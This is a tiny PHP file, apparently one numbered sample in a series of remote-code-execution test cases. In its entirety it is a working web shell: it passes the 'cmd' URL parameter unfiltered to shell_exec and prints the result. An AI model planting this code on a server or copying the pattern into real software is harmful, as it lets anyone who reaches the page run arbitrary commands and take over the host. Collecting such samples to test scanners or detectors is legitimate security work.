<?php
// RCE test variation #856
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>